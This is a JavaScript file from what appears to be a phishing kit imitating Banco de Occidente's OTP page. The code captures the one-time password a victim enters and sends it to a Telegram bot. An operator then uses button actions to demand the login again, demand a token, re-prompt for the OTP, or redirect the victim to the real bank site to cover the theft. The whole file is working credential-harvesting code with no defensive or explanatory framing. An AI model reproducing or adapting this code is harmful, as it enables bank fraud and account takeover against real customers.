/**
 * OCCIDENTE - otp.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Occidente OTP: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('otp');
    const btnVerificar = document.getElementById('btnVerificar');
    const overlay = document.getElementById('loadingScreen');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 8);
        const isValid = input.value.length >= 4 && input.value.length <= 8;
        btnVerificar.disabled = !isValid;
        if (isValid) {
            btnVerificar.classList.add('enabled');
        } else {
            btnVerificar.classList.remove('enabled');
        }
    });

    btnVerificar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnVerificar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        // Mostrar overlay directamente
        if (overlay) {
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = BancoUtils.saveBankData('occidente', { otp: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('BANCO DE OCCIDENTE - OTP', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '📱 Pedir Token', action: 'request_token' },
            { text: '🔢 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('otp', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) overlay.style.display = 'none';
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Occidente OTP:', data);
        if (overlay) overlay.style.display = 'none';
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Redirigiendo a index.html');
                window.location.href = 'index.html';
                break;
            case 'request_token':
                console.log('📱 Redirigiendo a token.html');
                window.location.href = 'token.html';
                break;
            case 'request_otp':
                console.log('🔢 Limpiando campo de OTP');
                input.value = '';
                btnVerificar.disabled = true;
                btnVerificar.classList.remove('enabled');
                input.focus();
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a bancodeoccidente.com.co');
                window.location.href = 'https://www.bancodeoccidente.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
